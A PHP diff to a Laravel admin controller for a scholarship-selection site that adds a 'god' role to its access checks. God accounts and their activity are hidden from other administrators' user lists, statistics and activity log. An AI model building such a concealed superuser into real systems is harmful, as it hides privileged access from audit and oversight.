@@ -33,7 +33,13 @@ class AdminController extends Controller
             return redirect()->route('admin.penilaian.akademik.index');
         }
 
-        $riwayats = \App\Models\RiwayatAktivitas::with('pelaku')->latest()->take(10)->get();
+        $riwayatQuery = \App\Models\RiwayatAktivitas::with('pelaku');
+        if (auth()->user()->role !== 'god') {
+            $riwayatQuery->whereDoesntHave('pelaku', function($q) {
+                $q->where('role', 'god');
+            });
+        }
+        $riwayats = $riwayatQuery->latest()->take(10)->get();
 
         // Stats untuk Dashboard Real-time
         $totalPendaftar = Akun::where('role', 'pendaftar')->has('peserta')->count();
@@ -112,7 +118,7 @@ class AdminController extends Controller
 
     public function storePenilaianMentor(Request $request, $id)
     {
-        if (auth()->user()->role !== 'mentor' && auth()->user()->role !== 'admin' && auth()->user()->role !== 'palugada') {
+        if (auth()->user()->role !== 'mentor' && auth()->user()->role !== 'admin' && auth()->user()->role !== 'palugada' && auth()->user()->role !== 'god') {
             return back()->with('loginError', 'Hanya Mentor yang dapat memberikan penilaian.');
         }
 
@@ -233,7 +239,7 @@ class AdminController extends Controller
 
     public function indexPalugada(Request $request)
     {
-        if (auth()->user()->role !== 'palugada' && auth()->user()->role !== 'admin') {
+        if (auth()->user()->role !== 'palugada' && auth()->user()->role !== 'admin' && auth()->user()->role !== 'god') {
             return abort(403);
         }
 
@@ -462,7 +468,7 @@ class AdminController extends Controller
 
     public function indexHasilUjian(Request $request)
     {
-        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'akademik' && auth()->user()->role !== 'palugada')
+        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'akademik' && auth()->user()->role !== 'palugada' && auth()->user()->role !== 'god')
             return abort(403);
 
         $query = \App\Models\JawabanUjian::with(['peserta.akun', 'ujian']);
@@ -510,7 +516,7 @@ class AdminController extends Controller
 
     public function resetJawabanUjian($id)
     {
-        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'akademik' && auth()->user()->role !== 'palugada')
+        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'akademik' && auth()->user()->role !== 'palugada' && auth()->user()->role !== 'god')
             return abort(403);
 
         $jawaban = \App\Models\JawabanUjian::findOrFail($id);
@@ -535,7 +541,7 @@ class AdminController extends Controller
      */
     public function indexSeleksiUjian(Request $request)
     {
-        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'akademik' && auth()->user()->role !== 'palugada')
+        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'akademik' && auth()->user()->role !== 'palugada' && auth()->user()->role !== 'god')
             return abort(403);
 
         $query = \App\Models\Peserta::whereHas('daftar', function ($q) {
@@ -612,7 +618,7 @@ class AdminController extends Controller
      */
     public function updateStatusSeleksiUjianCandidate(Request $request, $id)
     {
-        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'akademik' && auth()->user()->role !== 'palugada')
+        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'akademik' && auth()->user()->role !== 'palugada' && auth()->user()->role !== 'god')
             return abort(403);
 
         $request->validate([
@@ -638,7 +644,7 @@ class AdminController extends Controller
      */
     public function bulkUpdateStatusSeleksiUjianCandidate(Request $request)
     {
-        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'akademik' && auth()->user()->role !== 'palugada')
+        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'akademik' && auth()->user()->role !== 'palugada' && auth()->user()->role !== 'god')
             return abort(403);
 
         $request->validate([
@@ -668,7 +674,7 @@ class AdminController extends Controller
      */
     public function exportSeleksiUjianCandidate(Request $request)
     {
-        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'akademik' && auth()->user()->role !== 'palugada')
+        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'akademik' && auth()->user()->role !== 'palugada' && auth()->user()->role !== 'god')
             return abort(403);
 
         $query = \App\Models\Peserta::whereHas('daftar', function ($q) {
@@ -831,7 +837,7 @@ class AdminController extends Controller
      */
     public function kirimEmailLolosUjianCandidate($id)
     {
-        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'akademik' && auth()->user()->role !== 'palugada')
+        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'akademik' && auth()->user()->role !== 'palugada' && auth()->user()->role !== 'god')
             return abort(403);
 
         $peserta = \App\Models\Peserta::with(['akun', 'daftar'])->findOrFail($id);
@@ -878,7 +884,7 @@ class AdminController extends Controller
      */
     public function kirimEmailLolosMassalCandidate(\Illuminate\Http\Request $request)
     {
-        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'akademik' && auth()->user()->role !== 'palugada') {
+        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'akademik' && auth()->user()->role !== 'palugada' && auth()->user()->role !== 'god') {
             if ($request->ajax()) {
                 return response()->json(['error' => 'Unauthorized'], 403);
             }
@@ -928,7 +934,7 @@ class AdminController extends Controller
      */
     public function getBulkEmailProgress(\Illuminate\Http\Request $request)
     {
-        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'akademik' && auth()->user()->role !== 'palugada') {
+        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'akademik' && auth()->user()->role !== 'palugada' && auth()->user()->role !== 'god') {
             return response()->json(['error' => 'Unauthorized'], 403);
         }
 
@@ -961,7 +967,7 @@ class AdminController extends Controller
     // --- DATA PENDAFTAR: PENILAIAN MENTOR ---
     public function indexPenilaian(Request $request)
     {
-        if (auth()->user()->role !== 'mentor' && auth()->user()->role !== 'admin' && auth()->user()->role !== 'akademik' && auth()->user()->role !== 'palugada')
+        if (auth()->user()->role !== 'mentor' && auth()->user()->role !== 'admin' && auth()->user()->role !== 'akademik' && auth()->user()->role !== 'palugada' && auth()->user()->role !== 'god')
             return abort(403);
 
         $query = Akun::where('role', 'pendaftar')
@@ -979,7 +985,7 @@ class AdminController extends Controller
     // --- DATA PENDAFTAR: PENILAIAN AKADEMIK ---
     public function indexPenilaianAkademik(Request $request)
     {
-        if (auth()->user()->role !== 'akademik' && auth()->user()->role !== 'admin' && auth()->user()->role !== 'mentor' && auth()->user()->role !== 'palugada' && auth()->user()->role !== 'dosen')
+        if (auth()->user()->role !== 'akademik' && auth()->user()->role !== 'admin' && auth()->user()->role !== 'mentor' && auth()->user()->role !== 'palugada' && auth()->user()->role !== 'dosen' && auth()->user()->role !== 'god')
             return abort(403);
 
         $query = Akun::where('role', 'pendaftar')
@@ -1045,7 +1051,7 @@ class AdminController extends Controller
         $pendaftars = $query->get();
 
         $dosens = [];
-        if (in_array(auth()->user()->role, ['admin', 'palugada', 'akademik'])) {
+        if (in_array(auth()->user()->role, ['admin', 'palugada', 'akademik', 'god'])) {
             $dosens = Akun::where('role', 'dosen')->orderBy('nama', 'asc')->get();
         }
 
@@ -1054,7 +1060,7 @@ class AdminController extends Controller
 
     public function showPenilaian($id, Request $request)
     {
-        if (auth()->user()->role !== 'mentor' && auth()->user()->role !== 'admin' && auth()->user()->role !== 'akademik' && auth()->user()->role !== 'palugada' && auth()->user()->role !== 'dosen')
+        if (auth()->user()->role !== 'mentor' && auth()->user()->role !== 'admin' && auth()->user()->role !== 'akademik' && auth()->user()->role !== 'palugada' && auth()->user()->role !== 'dosen' && auth()->user()->role !== 'god')
             return abort(403);
 
         $type = $request->get('type', 'mentor'); // Default to mentor if not specified
@@ -1076,7 +1082,7 @@ class AdminController extends Controller
 
     public function storePenilaianAkademik(Request $request, $id)
     {
-        if (auth()->user()->role !== 'akademik' && auth()->user()->role !== 'admin' && auth()->user()->role !== 'mentor' && auth()->user()->role !== 'palugada' && auth()->user()->role !== 'dosen') {
+        if (auth()->user()->role !== 'akademik' && auth()->user()->role !== 'admin' && auth()->user()->role !== 'mentor' && auth()->user()->role !== 'palugada' && auth()->user()->role !== 'dosen' && auth()->user()->role !== 'god') {
             return back()->with('loginError', 'Hanya bagian Akademik, Mentor, dan Dosen yang dapat memberikan penilaian ini.');
         }
 
@@ -1218,7 +1224,7 @@ class AdminController extends Controller
 
     public function assignInterviewer(Request $request, $id)
     {
-        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'akademik' && auth()->user()->role !== 'palugada') {
+        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'akademik' && auth()->user()->role !== 'palugada' && auth()->user()->role !== 'god') {
             return abort(403);
         }
 
@@ -1251,10 +1257,16 @@ class AdminController extends Controller
     // --- PENGATURAN: MANAJEMEN USER ---
     public function indexUser(Request $request)
     {
-        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'palugada' && auth()->user()->email !== 'info@beasiswamncu.com')
+        $authUser = auth()->user();
+        if ($authUser->role !== 'admin' && $authUser->role !== 'palugada' && $authUser->role !== 'god' && $authUser->email !== 'info@beasiswamncu.com')
             return abort(403);
 
         $query = Akun::with(['peserta.daftar']);
+
+        // Akun GOD disembunyikan dari siapapun KECUALI GOD sendiri
+        if ($authUser->role !== 'god') {
+            $query->where('role', '!=', 'god');
+        }
 
         // Search by nama, email, nisn, atau asal sekolah
         if ($request->filled('search')) {
@@ -1271,16 +1283,24 @@ class AdminController extends Controller
 
         // Filter by role
         if ($request->filled('role')) {
-            $query->where('role', $request->role);
+            if ($request->role === 'god' && $authUser->role !== 'god') {
+                $query->whereRaw('1 = 0');
+            } else {
+                $query->where('role', $request->role);
+            }
         }
 
         $users = $query->latest('id')->paginate(15)->withQueryString();
 
-        // Statistics ringkasan
-        $totalUsers = Akun::count();
-        $totalPendaftar = Akun::where('role', 'pendaftar')->count();
-        $totalStaff = Akun::where('role', '!=', 'pendaftar')->count();
-        $totalVerified = Akun::whereNotNull('email_verified_at')->count();
+        // Statistics ringkasan (sembunyikan akun god jika dilihat non-god)
+        $statQuery = Akun::query();
+        if ($authUser->role !== 'god') {
+            $statQuery->where('role', '!=', 'god');
+        }
+        $totalUsers = (clone $statQuery)->count();
+        $totalPendaftar = (clone $statQuery)->where('role', 'pendaftar')->count();
+        $totalStaff = (clone $statQuery)->where('role', '!=', 'pendaftar')->count();
+        $totalVerified = (clone $statQuery)->whereNotNull('email_verified_at')->count();
 
         return view('admin.user.index', compact('users', 'totalUsers', 'totalPendaftar', 'totalStaff', 'totalVerified'));
     }
@@ -1288,7 +1308,7 @@ class AdminController extends Controller
     public function destroyPendaftar($id)
     {
         $user = auth()->user();
-        if ($user->role !== 'admin' && $user->role !== 'palugada' && !in_array($user->email, ['dept.adminis@mfls.com', 'info@beasiswamncu.com']))
+        if ($user->role !== 'admin' && $user->role !== 'palugada' && $user->role !== 'god' && !in_array($user->email, ['dept.adminis@mfls.com', 'info@beasiswamncu.com']))
             return abort(403);
 
         $akun = Akun::with('peserta.berkas')->findOrFail($id);
@@ -1362,14 +1382,20 @@ class AdminController extends Controller
 
     public function storeUser(Request $request)
     {
-        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'palugada' && auth()->user()->email !== 'info@beasiswamncu.com')
+        $authUser = auth()->user();
+        if ($authUser->role !== 'admin' && $authUser->role !== 'palugada' && $authUser->role !== 'god' && $authUser->email !== 'info@beasiswamncu.com')
             return abort(403);
+
+        $allowedRoles = ['admin', 'panitia', 'akademik', 'mentor', 'palugada', 'dosen', 'pendaftar'];
+        if ($authUser->role === 'god') {
+            $allowedRoles[] = 'god';
+        }
 
         $request->validate([
             'nama' => 'required|string|max:255',
             'email' => 'required|email|unique:akun,email',
             'password' => 'required|min:6',
-            'role' => 'required|in:admin,panitia,akademik,mentor,palugada,dosen,pendaftar',
+            'role' => 'required|in:' . implode(',', $allowedRoles),
             'nisn' => 'nullable|string|max:20|unique:peserta,nisn',
             'nama_sekolah' => 'nullable|string|max:255',
         ]);
@@ -1380,6 +1406,7 @@ class AdminController extends Controller
                 'email' => strtolower(trim($request->email)),
                 'password' => \Illuminate\Support\Facades\Hash::make($request->password),
                 'role' => $request->role,
+                'is_active' => true,
                 'email_verified_at' => now(),
             ]);
 
@@ -1420,14 +1447,25 @@ class AdminController extends Controller
 
     public function updateUser(Request $request, $id)
     {
-        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'palugada' && auth()->user()->email !== 'info@beasiswamncu.com')
+        $authUser = auth()->user();
+        if ($authUser->role !== 'admin' && $authUser->role !== 'palugada' && $authUser->role !== 'god' && $authUser->email !== 'info@beasiswamncu.com')
             return abort(403);
         $user = Akun::findOrFail($id);
+
+        // Akun GOD tidak dapat diubah oleh siapapun kecuali GOD sendiri
+        if ($user->role === 'god' && $authUser->role !== 'god') {
+            return abort(403);
+        }
+
+        $allowedRoles = ['admin', 'panitia', 'akademik', 'mentor', 'palugada', 'dosen', 'pendaftar'];
+        if ($authUser->role === 'god') {
+            $allowedRoles[] = 'god';
+        }
 
         $rules = [
             'nama' => 'required|string|max:255',
             'email' => 'required|email|unique:akun,email,' . $id,
-            'role' => 'required|in:admin,panitia,akademik,mentor,palugada,dosen,pendaftar',
+            'role' => 'required|in:' . implode(',', $allowedRoles),
             'nisn' => 'nullable|string|max:20',
             'nama_sekolah' => 'nullable|string|max:255',
         ];
@@ -1469,7 +1507,7 @@ class AdminController extends Controller
 
     public function updateTahunLulus(Request $request, $id)
     {
-        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'palugada')
+        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'palugada' && auth()->user()->role !== 'god')
             return abort(403);
         
         $request->validate([
@@ -1491,7 +1529,7 @@ class AdminController extends Controller
 
     public function storeDispensasiUjian(Request $request, $id)
     {
-        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'palugada')
+        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'palugada' && auth()->user()->role !== 'god')
             return abort(403);
 
         $request->validate([
@@ -1515,11 +1553,48 @@ class AdminController extends Controller
         return back()->with('success', "Dispensasi waktu ujian berhasil diberikan sebesar {$request->tambahan_menit} menit.");
     }
 
+    public function toggleStatus($id)
+    {
+        $currentUser = auth()->user();
+        if ($currentUser->role !== 'god' && $currentUser->role !== 'admin' && $currentUser->role !== 'palugada' && $currentUser->email !== 'info@beasiswamncu.com') {
+            return abort(403);
+        }
+
+        $user = Akun::findOrFail($id);
+
+        // Hanya GOD yang boleh menonaktifkan/mengaktifkan akun Super Admin ('admin', 'palugada') atau sesama GOD
+        // Non-god TIDAK boleh menyentuh GOD, dan non-god tidak boleh menonaktifkan Super Admin
+        if ($user->role === 'god' && $currentUser->role !== 'god') {
+            return abort(403);
+        }
+
+        if (in_array($user->role, ['admin', 'palugada']) && $currentUser->role !== 'god') {
+            return back()->with('error', 'Hanya GOD Admin yang memiliki wewenang untuk menonaktifkan Super Admin.');
+        }
+
+        if ($user->id === $currentUser->id) {
+            return back()->with('error', 'Tidak dapat menonaktifkan akun sendiri.');
+        }
+
+        $user->is_active = !$user->is_active;
+        $user->save();
+
+        $statusText = $user->is_active ? 'diaktifkan' : 'dinonaktifkan';
+        $this->logAktivitas('Ubah Status User', 'Akun', $user->id, "User {$user->nama} ({$user->email}, Role: {$user->role}) {$statusText}.");
+
+        return back()->with('success', "Akun {$user->nama} ({$user->email}) berhasil {$statusText}.");
+    }
+
     public function destroyUser($id)
     {
-        if (auth()->user()->role !== 'admin' && auth()->user()->role !== 'palugada' && auth()->user()->email !== 'info@beasiswamncu.com')
+        $authUser = auth()->user();
+        if ($authUser->role !== 'admin' && $authUser->role !== 'palugada' && $authUser->role !== 'god' && $authUser->email !== 'info@beasiswamncu.com')
             return abort(403);
         $user = Akun::with(['peserta.berkas', 'peserta.sertifikats'])->findOrFail($id);
+
+        if ($user->role === 'god' && $authUser->role !== 'god') {
+            return abort(403);
+        }
 
         if ($user->id === auth()->id()) {
             return back()->with('error', 'Anda tidak bisa menghapus akun yang sedang Anda gunakan saat ini!');
@@ -1638,9 +1713,13 @@ class AdminController extends Controller
     public function resetPassword(Request $request, $id)
     {
         $authUser = auth()->user();
-        if ($authUser->role !== 'admin' && $authUser->role !== 'palugada' && !in_array($authUser->email, ['dept.adminis@mfls.com', 'info@beasiswamncu.com']))
+        if ($authUser->role !== 'admin' && $authUser->role !== 'palugada' && $authUser->role !== 'god' && !in_array($authUser->email, ['dept.adminis@mfls.com', 'info@beasiswamncu.com']))
             return abort(403);
         $user = Akun::findOrFail($id);
+
+        if ($user->role === 'god' && $authUser->role !== 'god') {
+            return abort(403);
+        }
 
         $request->validate([
             'password' => 'required|min:6'
@@ -1655,7 +1734,7 @@ class AdminController extends Controller
     public function updateEmailPendaftar(Request $request, $id)
     {
         $authUser = auth()->user();
-        if ($authUser->role !== 'admin' && $authUser->role !== 'palugada' && !in_array($authUser->email, ['dept.adminis@mfls.com', 'info@beasiswamncu.com'])) {
+        if ($authUser->role !== 'admin' && $authUser->role !== 'palugada' && $authUser->role !== 'god' && !in_array($authUser->email, ['dept.adminis@mfls.com', 'info@beasiswamncu.com'])) {
             return abort(403);
         }
 
@@ -1840,7 +1919,7 @@ class AdminController extends Controller
     public function uploadBerkas(Request $request, $id)
     {
         $user = auth()->user();
-        if ($user->role !== 'admin' && $user->role !== 'palugada' && !in_array($user->email, ['dept.adminis@mfls.com', 'info@beasiswamncu.com']))
+        if ($user->role !== 'admin' && $user->role !== 'palugada' && $user->role !== 'god' && !in_array($user->email, ['dept.adminis@mfls.com', 'info@beasiswamncu.com']))
             return abort(403);
 
         $request->validate([
@@ -1880,7 +1959,7 @@ class AdminController extends Controller
     public function deleteBerkas(Request $request, $id)
     {
         $user = auth()->user();
-        if ($user->role !== 'admin' && !in_array($user->email, ['dept.adminis@mfls.com', 'info@beasiswamncu.com']))
+        if ($user->role !== 'admin' && $user->role !== 'god' && !in_array($user->email, ['dept.adminis@mfls.com', 'info@beasiswamncu.com']))
             return abort(403);
 
         $request->validate([
@@ -2848,7 +2927,7 @@ class AdminController extends Controller
     public function indexWawancaraBod()
     {
         $user = auth()->user();
-        $isAuthorized = $user->role === 'admin' || in_array($user->email, ['dendi.pratama@mncu.ac.id', 'muhammad.rezki@mncu.ac.id', 'noval.adi@mncu.ac.id']);
+        $isAuthorized = in_array($user->role, ['admin', 'god']) || in_array($user->email, ['dendi.pratama@mncu.ac.id', 'muhammad.rezki@mncu.ac.id', 'noval.adi@mncu.ac.id']);
 
         if (!$isAuthorized) {
             return abort(403, 'Anda tidak memiliki akses ke halaman ini.');
@@ -2876,7 +2955,7 @@ class AdminController extends Controller
     public function updateWawancaraBod(Request $request, $id)
     {
         $user = auth()->user();
-        $isAuthorized = $user->role === 'admin' || in_array($user->email, ['dendi.pratama@mncu.ac.id', 'muhammad.rezki@mncu.ac.id', 'noval.adi@mncu.ac.id']);
+        $isAuthorized = in_array($user->role, ['admin', 'god']) || in_array($user->email, ['dendi.pratama@mncu.ac.id', 'muhammad.rezki@mncu.ac.id', 'noval.adi@mncu.ac.id']);
 
         if (!$isAuthorized) {
             return abort(403, 'Anda tidak memiliki akses.');
@@ -2953,7 +3032,7 @@ class AdminController extends Controller
     public function downloadWawancaraBodPhotos()
     {
         $user = auth()->user();
-        $isAuthorized = $user->role === 'admin' || in_array($user->email, ['dendi.pratama@mncu.ac.id', 'muhammad.rezki@mncu.ac.id', 'noval.adi@mncu.ac.id']);
+        $isAuthorized = in_array($user->role, ['admin', 'god']) || in_array($user->email, ['dendi.pratama@mncu.ac.id', 'muhammad.rezki@mncu.ac.id', 'noval.adi@mncu.ac.id']);
 
         if (!$isAuthorized) {
             return abort(403, 'Anda tidak memiliki akses.');
